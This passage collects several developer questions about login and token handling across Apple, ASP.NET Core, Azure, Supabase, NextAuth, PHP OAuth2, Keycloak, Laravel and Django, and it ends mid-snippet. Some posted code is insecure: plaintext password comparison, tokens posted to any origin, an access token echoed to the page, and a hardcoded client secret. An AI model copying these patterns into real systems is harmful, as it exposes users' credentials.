"<p>I am trying to understand Sign in with Apple. I am assuming a situation where there is an app server, an ios app and the apple authentication provider. In the WWDC 2020 session &quot;Get the most out of Sign in with Apple&quot; Apple has <a href=""https://developer.apple.com/videos/play/wwdc2020/10173/?time=158"" rel=""nofollow noreferrer"">this</a> to say about the nonce value in the authorization request:</p>
<blockquote>
<p>But as we mentioned before, the request also has some properties that can help make the authorization process more secure. These are nonce and state.</p>
<p>These properties will allow you to verify that the authorization and credential you get after executing a request are the ones you were expecting. Let's start by talking about what these properties are. The nonce is an opaque blob of data sent as a string in the request. It is important to generate one unique nonce every time you create a new request, as later on, you will be able to verify this value.</p>
<p>In order to do that, the nonce value will be returned to you embedded in the identityToken property of the authorization credential.</p>
<p>This will allow you to verify this value in your server, helping prevent replay attacks.</p>
</blockquote>
<p>My understanding is: The app client creates an upredictable nonce for the authorization request sent to Apple's servers. If all goes well, Apple will return an identity token containing the same nonce. The client can check that the identity token contains the same nonce value that it included in the request, then go on sending that JWT to the application server which can use Apple's public key and the signature to make sure that the JWT is indeed signed by apple and be therefore sure that the user is who they claim to be.</p>
<p>But Apple says that</p>
<blockquote>
<p>This will allow you to verify this value in <strong>your server</strong>, helping prevent replay attacks.</p>
</blockquote>
<p>(Emphasis mine)</p>
<p>In the flow I described my application server would not know the nonce, so it would not be able to verify anything about it. Is the suggestion here that the client requests a nonce (and a session id) from the application server first before creating an authorization request. Then sends that nonce as part of the authorization request, and later sends the JWT with the included nonce and the session id to the application server? So that the application server can also verify that the nonce is indeed the same one assigned at the start of the session?</p>
"
"<p>I want to make 2 separate logins for admin and user.</p>
<p>I wrote 2 different controllers, one for admin which created at in area/admin, the other is for users which created at in controller.</p>
<p>Admin controller code:</p>
<pre><code>public IActionResult PostLogin(LoginModel model)
{
    UserLoginData user = _accountRepository.GetUserLoginData(model.UserName, model.Password);

    if (user != null)
    {
        HttpContext.Session.SetString(&quot;UserName&quot;, user.UserName);
        HttpContext.Session.SetInt32(&quot;UserId&quot;, user.UserId);

        var claims = new List&lt;Claim&gt;();
        claims.Add(new Claim(ClaimTypes.Name, user.UserName.ToString()));
        string[] roles = user.Role.RoleName.Split(&quot;,&quot;);

        foreach (string role in roles)
        {
            claims.Add(new Claim(ClaimTypes.Role, role));
        }

        var identity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);

        HttpContext.Response.Cookies.Append(&quot;Admin&quot;, &quot;Admin&quot;);
        var principal = new ClaimsPrincipal(identity);
        var props = new AuthenticationProperties();
        props.IsPersistent = false;
        props.ExpiresUtc = DateTime.UtcNow.AddDays(2);
        HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, principal, props).Wait();
       return RedirectToAction(&quot;Dashboard&quot;, &quot;Home&quot;, new { area = &quot;Admin&quot; });
    }
    else
    {
        TempData[&quot;NotValid&quot;] = &quot;Invalid username or password. Please try again.&quot;;
        Console.WriteLine(&quot;Invalid username or password. Please try again.&quot;);
        return RedirectToAction(&quot;Login&quot;);
    }
}
</code></pre>
<p>User controller:</p>
<pre><code>public IActionResult PostLogin(UserLoginData model)
{
    UserLoginData user = _accountRepository.GetUserLoginData(model.EmailId, model.Password);

    if (user != null)
    {
        HttpContext.Session.SetString(&quot;Email&quot;, user.EmailId);
        HttpContext.Session.SetInt32(&quot;usrid&quot;, user.UserId);

        var claims = new List&lt;Claim&gt;();

        claims.Add(new Claim(ClaimTypes.Name, user.EmailId.ToString()));
        string[] roles = { &quot;Customer&quot; };

        foreach (string role in roles)
        {
            claims.Add(new Claim(ClaimTypes.Role, role));
        }

        HttpContext.Response.Cookies.Append(&quot;Customer&quot;, &quot;1&quot;);

        var identity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
        
        var principal = new ClaimsPrincipal(identity);
        var props = new AuthenticationProperties();
        props.IsPersistent = false;
        props.ExpiresUtc = DateTime.UtcNow.AddDays(2);
        HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, principal, props).Wait();

        return RedirectToAction(&quot;products&quot;, &quot;home&quot;);
    }
    else
    {
        TempData[&quot;NotValid&quot;] = &quot;Invalid username or password. Please try again.&quot;;
        Console.WriteLine(&quot;Invalid username or password. Please try again.&quot;);
        return RedirectToAction(&quot;Login&quot;);
    }
}
</code></pre>
<p><code>Program.cs</code> code:</p>
<pre><code>builder.Services.AddSession(options =&gt;
{
    options.IdleTimeout = TimeSpan.FromHours(24);
    options.Cookie.HttpOnly = true;
    options.Cookie.IsEssential = true;
});
builder.Services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
    .AddCookie(options =&gt;
    {
        options.ExpireTimeSpan = TimeSpan.FromDays(10);
        options.AccessDeniedPath = new PathString(&quot;/admin/account/login&quot;);
        options.Events = new CookieAuthenticationEvents
        {
            OnRedirectToLogin = ctx =&gt;
            {
                ctx.Response.Redirect(ctx.RedirectUri);
                return Task.CompletedTask;
            }
        };
    })
    .AddCookie(&quot;Customer&quot;, options =&gt;
    {
        options.ExpireTimeSpan = TimeSpan.FromDays(10);
        options.AccessDeniedPath = new PathString(&quot;/account/login&quot;);
        options.Events = new CookieAuthenticationEvents
        {
            OnRedirectToLogin = ctx =&gt;
            {
                ctx.Response.Redirect(ctx.RedirectUri);
                return Task.CompletedTask;
            }
        };
    });

var app = builder.Build();

// Configure the HTTP request pipeline.
if (!app.Environment.IsDevelopment())
{
    app.UseExceptionHandler(&quot;/Home/Error&quot;);
    app.UseHsts();
}

app.UseHttpsRedirection();
app.UseStaticFiles();

app.UseRouting();
app.UseAuthentication();
app.UseAuthorization();
app.UseSession();
app.UseEndpoints(endpoints =&gt;
{
    endpoints.MapControllerRoute(
      name: &quot;areas&quot;,
      pattern: &quot;{area:exists}/{controller=Home}/{action=Dashboard}/{id?}&quot;
    );
    endpoints.MapControllerRoute(
      name: &quot;default&quot;,
    pattern: &quot;{controller=Home}/{action=Index}/{id?}&quot;
    );
});
</code></pre>
<p>Now I have provide my admin controller and user controller code basically both are same name <code>AccountController</code> but both are in different place one is on Area/Admin and one is on controller (noraml path).</p>
<p>Now what happening with above code is like if I make authorization on any user page then if I haven't login then it's redirecting on <code>/account/login</code> it's fine but now if i am accessing admin page without login then it's also redirecting me on <code>/account/login</code> instead of <code>/admin/account/login</code> I have tried many things which I got still not get any proper way or solution.</p>
<p>I would like to you guys please check the above things and help me out to solve this problem. And thanks in advance for whoever can give their time to solve this problem and help me learn something new.</p>
"
"<p>I am trying to create an ASP.NET Core Web API which will use Microsoft login. I want the code to fetch the token and later I will use that token, that is a different story, as of now I am able to login but just after login, I get this error</p>
<blockquote>
<p>We're unable to complete your request<br />
Invalid_request: The provided value for the input parameter 'redirect_uri' is not valid. The expected value is a URI which matches a redirect URI registered for this client application.</p>
</blockquote>
<p>In the Azure portal, I have registered a web application and mentioned redirect URI as <code>http://localhost:5091/testlogin</code> and below is the code</p>
<pre><code>public class AccountController : ControllerBase
{
    [HttpGet(&quot;login&quot;)]
    public IActionResult Login()
    {
        var redirectUrl = Url.Action(nameof(TestLogin), &quot;Account&quot;, null, Request.Scheme);
        var properties = new AuthenticationProperties { RedirectUri = redirectUrl };

        return Challenge(properties, &quot;Microsoft&quot;);
    }

    [HttpGet(&quot;testlogin&quot;)]
    public IActionResult TestLogin()
    {
        foreach (var claim in User.Claims)
        {
            Console.WriteLine($&quot;{claim.Type}: {claim.Value}&quot;);
        }

        if (User.Identity.IsAuthenticated)
        {
            var userEmail = User.FindFirst(ClaimTypes.Email)?.Value;
            var authenticationToken = User.FindFirst(&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier&quot;)?.Value;
            return Ok(new
                      {
                          Email = userEmail,
                          Token = authenticationToken
                      });
        }
        else
        {
            return Unauthorized(&quot;User is not authenticated.&quot;);
        }
    }

    [HttpPost(&quot;logout&quot;)]
    public async Task&lt;IActionResult&gt; Logout()
    {
        await HttpContext.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);
        await HttpContext.SignOutAsync(OpenIdConnectDefaults.AuthenticationScheme);
        return Ok(&quot;Logged out successfully&quot;);
    }
}
</code></pre>
"
"<p>So in my React Native app, I have screen that grabs user data and pass it to sub components.
However, the code gives the below error which seems it is not rendered before the screen OR maybe it is totally die to another reason.</p>
<pre><code>Cannot read property 'user_meradata' of null
</code></pre>
<p>Here is my code:</p>
<pre><code>import React, {useState, useEffect} from 'react';
import { StyleSheet, SafeAreaView } from 'react-native';
import HomeHeader from '../components/homeScreen/homeHeader';
import NextJob from '../components/homeScreen/NJ';
import JobFinder from '../components/homeScreen/JF';
import ButtomSection from '../components/homeScreen/buttonsSection';
import { supabase } from '../lib/supabase'; // adjust the import path to your Supabase client
  

const Home = ({ navigation }) =&gt; {
    const [loading, setLoading] = useState(false)
    const [user, setUser] = useState(null);
    useEffect(() =&gt; { 
        setLoading(true)
        const fetchUser = async () =&gt; {
            const { data: { user } } = await supabase.auth.getUser()
            setUser(user);
            setLoading(false);
        }
        fetchUser();
        setLoading(false)
    }, []);

    return (
        &lt;SafeAreaView&gt;
            &lt;HomeHeader user={user} /&gt;
            &lt;NJ /&gt;
            &lt;JF /&gt;
            &lt;ButtomSection navigation={navigation} /&gt;
        &lt;/SafeAreaView&gt;
    );
};

export default Home;
</code></pre>
<p>And this is HomeHeader.js that supposed to get the <code>data</code>.</p>
<pre><code>const homeHeader = ({ user }) =&gt; {
    
    const handleSignOut = async() =&gt; {
        const { error } = await supabase.auth.signOut();
        if (error) {
            console.log(error);
        }
    } 

    return (
        &lt;View style={ styles.container } &gt;
            &lt;Text style={ styles.greetingMessage }&gt;Greeting {user.user_metadata.username}!&lt;/Text&gt;
            &lt;TouchableOpacity onPress={ () =&gt; console.log(user.user_metadata) }&gt;
                &lt;Text&gt;Press&lt;/Text&gt;
            &lt;/TouchableOpacity&gt;
            &lt;TouchableOpacity onPress={ handleSignOut }&gt;
                &lt;Ionicons name=&quot;menu&quot; size={40} color=&quot;black&quot; style={ styles.menuButton } /&gt;
            &lt;/TouchableOpacity&gt;
        &lt;/View&gt;
    );
};
</code></pre>
<p>The error mentioned about  but I noticed if I change the line
<code>Greeting {user.user_metadata.username}!</code> to <code>Greeting {user ? user.user_metadata.username : null }!</code> it works. But why is that?</p>
"
"<p>I am trying to create a test for login 100 users. However, the web application does not allow logging in with one login more than twice from one instance, nor does it allow multiple logging in. How would I create it? For 1 thread group user, I passed the test from login to activity and logout. If I give thread group 2 the test fails because of the token. Do you have any suggestions? well thank you</p>
<p>performance test JMeter</p>
"
"<p>i keep getting empty user object in my session object.</p>
<p>i keep getting an empty user obj in the session, this is my <code>auth.ts</code></p>
<pre><code>import NextAuth from 'next-auth';
import { authConfig } from './auth.config';
import Credentials from 'next-auth/providers/credentials';
import { getUser } from './app/lib/data';
import { z } from 'zod';


// zod schema
const UserSchema = z.object({
    username: z.string().max(10).min(2),
    password: z.string().min(8),
});



export const { auth, signIn, signOut } = NextAuth({
    ...authConfig,
    providers: [
        Credentials({
            async authorize(credentials) {

                const parsedCredentials = UserSchema.safeParse(credentials);
                console.log(parsedCredentials);


                if (parsedCredentials.success) {

                    const { username, password } = parsedCredentials.data;
                    const user = await getUser(username);

                    if (!user) return null;
                    
                    if (user.password === password) {
                        return user;
                    } // TODO: use bcrypt
                }


                console.log('invalid cred');
                return null;

            },
        }),
    ],
    callbacks: {
        authorized(params) {
          return !!params.auth?.user;
        },
      },
});
</code></pre>
<p>the session object</p>
<pre><code>{ user: {}, expires: &quot;2024-03-20T06:33:01.264Z&quot; }
</code></pre>
<p>the userSchema when creating the user and saving to db</p>
<pre><code>username: string
password: string
is_admin: boolean
expert: boolean
created_at: date
</code></pre>
<p>the signUp action for the form in <code>auth-actions.ts</code></p>
<pre><code>export async function signUp(prevState: State, formData: FormData) {

    const validatedFields = CreateUser.safeParse({
        username: formData.get('username'),
        password: formData.get('password'),
    });

    if (!validatedFields.success) {
        return {
            errors: validatedFields.error.flatten().fieldErrors,
            message: 'Missing Fields. Failed to sign up.',
        };
    }

    const useroObj = validatedFields.data;
    const usernameTaken = await usernameIsUnique(useroObj.username);
    if (usernameTaken) {
        return {
            errors: { username: ['someone beat you to it, choose somethiing else'] }
        };
    }


    // create the user before sign in
    try {
        const user = await createUser(useroObj);
    } catch (error) {
        // database error
        return {
            message: 'something went wrong please try again later',
        };
    }

    // sign in user to session
    const authUser = await signIn('credentials', formData);
    

    revalidatePath('/', 'layout');

    return {
        message: 'signed up successfully'
    };

}
</code></pre>
<p>its obvious that this is my first time using next-auth, and i tried reading the docs, but could only get so much from it--- please help me out thanks</p>
"
"<p>I'm try to do login script, where I want to login with the Microsoft OAuth2.0 and Azure Active Directory (or Mirosoft entra ID). The Authentification works and I get the Autorizecode, but the access token is not sent back to my OAuth2.0 provider from the success.php side. I've tried so many things like debugging, new code..., but nothing works. By the way, the authorization code is given on the success.php in the path above. Of course, all the data is changed for security reasons.</p>
<p>index.php</p>
<pre><code>&lt;?php

//TODO: Azure Synchronisation 

session_start();

     //* Überprüfen, ob der Benutzer authentifiziert ist
if (isset($_SESSION['token'])) 
{
    header('Location: http://localhost/success.php');  //! Der Benutzer ist bereits authentifiziert
    exit();
}
else
{
header('Location: https://login.microsoftonline.com/a502008d-5bd7-4ad1-b8e0-668da72219a8/oauth2/v2.0/authorize?client_id=XXXXXXXXX&amp;response_type=code&amp;redirect_uri=http%3A%2F%2Flocalhost%2Fsuccess.php&amp;response_mode=query&amp;scope=openid+email+offline_access+profile+User.Read&amp;state=12345&amp;code_challenge=XXXXXXXXXXXXXX&amp;code_challenge_method=S256');  //! Der Benutzer ist bereits authentifiziert
exit();
}
     
//* Überprüfen, ob der Benutzer bereits mit einem Office-Dienst verbunden ist
if (isset($_SERVER['AUTH_USER'])) 
{
sleep(1);
header('Location: http://localhost/success.php'); //! Der Benutzer ist bereits angemeldet
exit();
}



require_once($_SERVER['DOCUMENT_ROOT'].'/Assets/Configs/server.php'); //*Einbinden von server.php
$windowsUser = isset($_SERVER['AUTH_USER']) ? $_SERVER['AUTH_USER'] : null; //*Variable für Authentifizierung
require_once __DIR__.'/vendor/autoload.php'; //* Datei autoload.php einbinden


use \League\OAuth2\Client\Provider\GenericProvider; //* Composer (PHP-Bibliothek)

if($windowsUser) 
{
    
    $clientId = 'XXXXXXXXXXXXXXXXX'; //* Anwendungs-ID (Client)
    $clientSecret = 'XXXXXXXXXXXXXXXXX'; //* Geheime Clientschlüssel
    $tenantId = 'XXXXXXXXXXXXXXXXX'; //* Verzeichnis-ID (Mandant)
 
    //* Konfigurationsinformationen für OAuth2-Provider
    $provider = new GenericProvider([
        'clientId'                =&gt; $clientId,
        'clientSecret'            =&gt; $clientSecret,
        'redirectUri'             =&gt; 'http://localhost/success.php', //* UmleitungsURI
        'urlAuthorize'            =&gt; &quot;https://login.microsoftonline.com/XXXXXXXXXXXXXXXXX/oauth2/v2.0/authorize?client_id=XXXXXXXXXXXXXXXXX&amp;response_type=code&amp;redirect_uri=http%3A%2F%2Flocalhost%2Fsuccess.php&amp;response_mode=query&amp;scope=openid+email+offline_access+profile+User.Read&amp;state=12345&amp;code_challenge=XXXXXXXXXXXXXXXXX&amp;code_challenge_method=S256&quot;,
        'urlAccessToken'          =&gt; &quot;https://login.microsoftonline.com/XXXXXXXXXXXXXXXXX/oauth2/v2.0/token&quot;,
        'urlResourceOwnerDetails' =&gt; '',
        'scopes'                  =&gt; ['openid', 'email', 'offline_access', 'profile', 'User.Read'], //* Berechtigungen 
        'codeChallengeMethod'     =&gt; 'S256',
    ]);


    if (isset($_GET['code'])) {
        $authorization_code = $_GET['code']; // Autorisierungscode aus GET-Parametern auslesen

        try {
            // Autorisierungscode verwenden, um Zugriffstoken zu erhalten
            $accessToken = $provider-&gt;getAccessToken('authorization_code', [
                'code' =&gt; $authorization_code,
            ]);

            // JSON-Antwort in ein assoziatives Array umwandeln
            $response = json_decode($accessToken-&gt;getBody(), true);
            

            // Zugriffstoken speichern
            $_SESSION['token'] = $accessToken-&gt;getToken();
            $_SESSION['id_token'] = $accessToken-&gt;getValues()['id_token'];

            $accessTokenValue = $accessToken-&gt;getToken();
            $_SESSION['accesstoken'] = $accessTokenValue;

            // Weiterleitung zur Erfolgsseite
            header('Location: http://localhost/success.php');
            exit();
        } catch (\League\OAuth2\Client\Provider\Exception\IdentityProviderException $e) {
            
            echo &quot;Fehler beim Abrufen des Zugriffstokens: &quot; . $e-&gt;getMessage();
        }
    } else {
        // Benutzer muss sich einloggen und wird dann zu Azure AD weitergeleitet
        $authUrl = $provider-&gt;getAuthorizationUrl(); // Autorisierungs-URL abrufen
        header('Location: ' . $authUrl); // Weiterleitung zur Autorisierungs-URL
        exit();
    }
}
?&gt;
</code></pre>
<p>Success.php</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;DE&quot;&gt;

&lt;?php
session_start();


$username = $_SESSION['user'];
$Erfolg ='Sie haben sich erfolgreich angemeldet';
?&gt;

    &lt;head&gt; 
        &lt;meta charset=&quot;UTF-8&quot;&gt;
        &lt;link rel=&quot;stylesheet&quot; href=&quot;Css.css&quot;&gt;
        &lt;title&gt;
            Erfolg
        &lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;header&gt;
            &lt;div id=&quot;Überschrift&quot;&gt;
                &lt;h1&gt;ITH Bolting Technology - Login&lt;/h1&gt;
                &lt;?php
                    echo &quot;Benutzer: &quot;;
                    echo($username);
                ?&gt;
            &lt;/div&gt;
        &lt;/header&gt;
        &lt;main&gt;
            &lt;h3&gt;
                &lt;?php
                    echo($Erfolg);
                    
    // Überprüfen, ob die Anzahl der Benutzer in der Session vorhanden ist
    if(isset($_GET['code'])) {
        $authorization_code = $_GET['code'];
        echo &quot;Autorisierungscode: &quot; . $authorization_code;
    } else {
        echo &quot;Autorisierungscode nicht gefunden.&quot;;
    }
    
    
    
    if (isset($_SESSION['user_count'])) {
        echo &quot;&lt;p&gt;Anzahl der Benutzer aus Azure AD: &quot; . $_SESSION['user_count'] . &quot;&lt;/p&gt;&quot;;
    } else {
        echo &quot;&lt;p&gt;Es wurden keine Benutzer abgerufen.&lt;/p&gt;&quot;;
    }


    if(isset($_SESSION['accessToken']))
    {
        echo &quot;Access Token: &quot; . $_SESSION['accesstoken']; 
    }
    else
    {
        echo &quot;Es wurde kein Accesstoken gefunden&quot;;
    }

                ?&gt;
            &lt;/h3&gt;       
        &lt;/main&gt;
    &lt;/body&gt;

&lt;/html&gt;

</code></pre>
"
"<p>I am currently working on Sendgrid, a customer communication platform that helps businesses send transactional emails. The majority of emails are delivered and received, to email addresses that appear to be correct.</p>
<p>But for the past few days, I've been seeing this kind of recipient: user12345@gmail.fr or user13527@outlook.com.</p>
<p>On the &quot;Activity&quot; interface, where are listed all the recipients, some addresses are displayed correctly, and others seem to be encrypted, with the beginning of the mail as &quot;user...@&quot; as you can see above.</p>
<p>I don't know if this problem comes from the API connected to an external database, or from the tool I'm using Sendgrid (display problem?) or from the recipient.</p>
<p>Thanks for the help!</p>
"
"<p>I am trying to include authentication via keycloak in an existing software that is extendable via custom javascript. Other solutions like the Google AAI work just fine, but I am having issues with keycloak. Problem is that the extendable authentication widget is displayed in an iframe, thus the standard <code>keycloak.login()</code> method does not work because displaying of keycloak in an iframe is disabled, which as I understand is also the correct behaviour.</p>
<p>Trying to work around that I used the <code>keycloak.createLoginUrl()</code> to open the authentication in a new window, which also works and lets me successfully authenticate via my third party. But now I need to access the token that is returned upon successful login via keycloak to start an authenticated session in my software, which is the point I am struggling with right now, because the keycloak object is still considered as unauthenticated and no message event is triggered I believe I am missing something obvious in the workings of keycloak, maybe somebody sees the error in my ways. The following code is the entire login procedure, where <code>window.parent.postMessage(message, &quot;*&quot;);</code> passes the token back to the software.</p>
<pre><code>window.onload =  function () {
        keycloak = new Keycloak({...
        });

        keycloak.onTokenExpired = function () {
          keycloak
            .updateToken(30)
            .success(() =&gt; {
              console.log(&quot;Successfully got a new token&quot;, keycloak.token);
              let message = {
                type: &quot;customAuthentication&quot;,
                token: keycloak.token,
              };
              window.parent.postMessage(message, &quot;*&quot;);
            })
            .error(() =&gt; {
              console.log(&quot;Error upon refreshing the keycloak token&quot;);
            });
        };

       keycloak
          .init({
            checkLoginIframe: false,
          })
          .then(function (authenticated) {
            if (authenticated) {
              console.log(keycloak);
              let message = {
                token: keycloak.token,
              };

              if (window.opener) {
                message.type = &quot;keycloakAuthSuccess&quot;;
                window.opener.postMessage(message, &quot;*&quot;);
                window.close();
              } else {
                message.type = &quot;customAuthentication&quot;;
                window.parent.postMessage(message, &quot;*&quot;);
              }
            } else {
              const button = document.getElementById(
                &quot;button-custom-keycloak-login&quot;
              );
              button.onclick = function () {
                window.open(keycloak.createLoginUrl({
                    redirectUri : &quot;...&quot;
                }), &quot;Keycloak login popup&quot;);
              };
            }
          });

        window.addEventListener(&quot;message&quot;, (event) =&gt; {
          let message = event.data;
          if (message &amp;&amp; message.type === &quot;signOut&quot;) {
            keycloak.logout();
          } else if (message &amp;&amp; message.type === &quot;keycloakAuthSuccess&quot;) {
            keycloak.login();
          }
        });
      };
</code></pre>
"
"<p>I know that the safe approach to work with auth tokens is to use Http-Only, because with that, the JWT token will be read and set only on the server side. Ok, that makes sense to me.</p>
<p>My problem is: How can I apply logic to allow users access to some routes only when they are logged in successfully? Currently, I'm storing the auth token in session storage and using Angular auth guards to validate if the auth token is valid. But how would I validate the auth token in the Angular auth guards if the auth token is not readable on the client side?</p>
"
"<p>I have a web application TODO list. Users can add, modify, and delete tasks. Issue is that every user who log in to my web application can see all tasks that are created by other users. My idea is to add cell to <code>tasks</code> database table with <code>user_id</code> (ID of the user that created task), then somehow application get this <code>user_id</code> and print out tasks with this ID. Can you describe please how can I realise this thing?</p>
<p>I am working with Laravel 10 and Vue.</p>
<p>I tried to get this users id and put in tasks database but it didn't work out. I tried it to do with User and Task model.</p>
"
"<p>I'm trying to Authorize access to Log Viewer, I'm using laravel to build API and JWT to generate token and spatie Package for Roles and Permissions.</p>
<p>I created this middleware:</p>
<pre><code>    {
        if (Auth::check() &amp;&amp; Auth::user()-&gt;hasPermissionTo('view-logs')) {
            return $next($request);
        }

        abort(401, 'Unauthorised');
    }
</code></pre>
<p>and publish log-viewer-views by this command:
<code>php artisan vendor:publish --tag=log-viewer-views</code></p>
<p>in the blade file:</p>
<pre><code>&lt;!-- Global LogViewer Object --&gt;
&lt;script&gt;
    window.LogViewer = @json($logViewerScriptVariables);

    // Add additional headers for LogViewer requests like so:
    var token = localStorage.getItem('Authorization');
    window.LogViewer.headers['Authorization'] ='Bearer ' + token;

&lt;/script&gt;
</code></pre>
<p>but the middleware can't see the user is Auth it's always return 401 UNAUTHORIZED</p>
<p>I thing the blade didn't send the token</p>
<p>Set the token manually in local storage and Debug each step</p>
"
"<h2>Background</h2>
<ul>
<li>We are using Azure DevOps Pipelines to deploy a SPFx package to a SharePoint online site collection app catalog</li>
<li>Deployments are being done in a PowerShell task using the M365 CLI</li>
<li>Authentication is done by an AD app registration and a certificate with Sites.Selected access</li>
<li>Sites.Selected has been granted with FullControl on the target site</li>
<li>We are using <code>m365 spo app instance list</code> to determine if the app has already been added to the site, so we know if we need to install or upgrade the package</li>
</ul>
<h2>Problem</h2>
<ul>
<li>The <code>m365 spo app instance list</code> command returns an empty array even if there are multiple SPFx packages added to the site</li>
</ul>
<h2>Investigation So Far</h2>
<ul>
<li>The <code>m365 spo app instance list</code> command calls <a href=""https://tenant.sharepoint.com/sites/site/_api/web/AppTiles?$filter=AppType%20eq%203"" rel=""nofollow noreferrer"">https://tenant.sharepoint.com/sites/site/_api/web/AppTiles?$filter=AppType%20eq%203</a></li>
<li>Browing to the url in an authenticated session with a user which has owner access brings back the data as expected</li>
<li>Using Postman with the url and the bearer token taken from the pipeline step confirms an empty array is being returned</li>
<li>Removing the filter in Postman returns other data correctly (all the lists and libraries on the site) but not the SPFx apps added to the site</li>
<li>It appears authenticating via a certificate and Sites.Selected FullControl does not have access to see the installed SPFx apps</li>
</ul>
<p>Anyone come across this issue before?</p>
"
"<p>I have a three web application.</p>
<p>Each of these applications has its own specificity and account database.</p>
<p>I'd like to develop a common login page. The account would be common to all applications</p>
<p>For example, <code>login.fr?redirect=myApp2</code> is my centralized connection and redirect to my second application</p>
<p>How to do it?</p>
<p>I thought of 2 solutions:</p>
<ol>
<li><p>Use OAuth2 or OpenID Connect. But I don't think that's what it's for: it's for a centralized connection, internal to our products. Not an identity provider for external applications.</p>
</li>
<li><p>Simply: a connection that holds all user information and generate a JWT for applications</p>
</li>
</ol>
<p>Thanks</p>
"
"<p>I have three web applications. Each of these applications has its own specificity and account database.</p>
<p>I'd like to develop a common login page. The account would be common to all applications. For example, <code>login.fr?redirect=myApp2</code> is my centralized connection and redirects to my second application</p>
<p>How to do it?</p>
<p>I thought of 2 solutions:</p>
<ul>
<li><p>Use OAuth2 or OpenID Connect. But I don't think that's what it's for: it's for a centralized connection, internal to our products. Not an identity provider for external applications.</p>
</li>
<li><p>Simply: a connection that holds all user information and generates a JWT for applications</p>
</li>
</ul>
"
"<p>I got a issue with SimpleJWT on my API built in Django, it takes 2 secs to response.
I know it doesn't seem like a long time but I really need to improve it.
On the Profile table in MySQL database, username and password fields are indexed.
I was reading the official documentation but I don't see any advice for improve performance.</p>
<p>Someone there with a better knowledge than me that who can help me?</p>
<p>settings.py</p>
<pre><code>SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(minutes=6000),
    'ALGORITHM': 'HS256',
    'SIGNING_KEY': SECRET_KEY,  
}
</code></pre>
<p>urls.py  (cutted)</p>
<pre><code>from rest_framework_simplejwt.views import (TokenObtainPairView, TokenRefreshView)


urlpatterns = [
    path('', include('api.urls')),
    path('token/', TokenObtainPairView.as_view(), name='token_obtain_pair')
]
</code></pre>
<p>I tried indexing the username and password fields on the Profile table.</p>
"
"<p>I'm trying to setup a simple authentication process in web api using Keycloak as identity provider. And almost everything works as expected. When client is trying to reach protected route, the keycloak login popup shows up, user logs in and both asp.net and keycloak cookies are being stored.</p>
<p><a href=""https://i.stack.imgur.com/HLxHW.png"" rel=""nofollow noreferrer"">Stored cookies</a></p>
<p>In realm settings I specified access token lifespan to 30 seconds.</p>
<p><a href=""https://i.stack.imgur.com/lSzbK.png"" rel=""nofollow noreferrer"">Access token lifespan</a></p>
<p>For test purposes when I deleted the Keycloak cookies and left only the ones created by web api my protected route is still accessible. But the problem is that it is accessible even if access token already expired (30 seconds passed). Can you explain to me why it works that way?</p>
<p>Here's authentication part of code:</p>
<pre><code>builder.Services.AddAuthorization();
builder.Services.AddAuthentication(options =&gt;
{
    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;
    options.DefaultChallengeScheme = OpenIdConnectDefaults.AuthenticationScheme;
})
.AddCookie()
.AddOpenIdConnect(options =&gt;
{
    options.RequireHttpsMetadata = false;
    options.Authority = &quot;http://localhost:8080/realms/testrealm&quot;;
    options.ClientId = &quot;testclient&quot;;
    options.ClientSecret = &quot;kUOYGYajzgic9Feuw5rE5WRQLtgXuNTm&quot;;
    options.ResponseType = &quot;code&quot;;
    options.SaveTokens = true;
    options.Scope.Add(&quot;openid&quot;);
    options.TokenValidationParameters = new TokenValidationParameters
    {
        NameClaimType = &quot;preferred_username&quot;,
        RoleClaimType = &quot;roles&quot;,
        ValidateLifetime = true,
        ClockSkew = TimeSpan.Zero
    };
});
</code></pre>
<p>I've tried changing the clockskew, signing user out from realm sessions panel, but protected route was still accessible.</p>
"
"<p>&quot;Password in the Cloud&quot; - is this definition meant to be a catch-all term for any saved/stored credential (via Chrome, Bitwarden, or any other password manager).  Or does it have a more exacting definition.  <a href=""https://learn.microsoft.com/en-us/graph/api/signin-list?view=graph-rest-beta&amp;tabs=http"" rel=""nofollow noreferrer"">Documentation</a> doesn't define which I assume that it was assumed to a catch-all.</p>
<p><a href=""https://i.stack.imgur.com/VWggO.png"" rel=""nofollow noreferrer"">Entra Sign-In Logs</a></p>
<p>Need guidance on nomenclature of terms.</p>
"
"<p>it might be something error in one of this code the auth js file doesnt seems working because i enter any credential i get login i have sample database as id 1 and passwd 1234 in students collection</p>
<p>app.js
<a href=""https://i.stack.imgur.com/j8uiv.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/j8uiv.png"" alt=""enter image description here"" /></a></p>
<p>this is server.js file</p>
<pre><code>import React from &quot;react&quot;;
import ReactDOM from &quot;react-dom&quot;;
import { BrowserRouter } from &quot;react-router-dom&quot;;
import &quot;./index.css&quot;;
import App from &quot;./App&quot;;

ReactDOM.render(
    &lt;React.StrictMode&gt;
        &lt;BrowserRouter&gt;
            &lt;App /&gt;
        &lt;/BrowserRouter&gt;
    &lt;/React.StrictMode&gt;,
    document.getElementById(&quot;root&quot;)
);


</code></pre>
<p>login.jsx</p>
<p><div class=""snippet"" data-lang=""js"" data-hide=""false"" data-console=""true"" data-babel=""false"">
<div class=""snippet-code"">
<pre class=""snippet-code-js lang-js prettyprint-override""><code>import React, { useState } from ""react"";
import axios from ""axios"";
import { Link } from ""react-router-dom"";

import ""./styles.css"";

const Login = () =&gt; {
  const [data, setData] = useState({ enrollment_no: """", password: """" });
  const [error, setError] = useState("""");

  const handleChange = ({ currentTarget: input }) =&gt; {
    setData({ ...data, [input.name]: input.value });
  };

  const handleSubmit = async (e) =&gt; {
    e.preventDefault();
    try {
      const url = ""http://localhost:5000/api/signin"";
      const { data: res } = await axios.post(url, data);
      localStorage.setItem(""access_token"", res.data);
      window.location = ""/"";
    } catch (error) {
      if (
        error.response &amp;&amp;
        error.response.status &gt;= 400 &amp;&amp;
        error.response.status &lt;= 500
      ) {
        setError(error.response.data.message);
      }
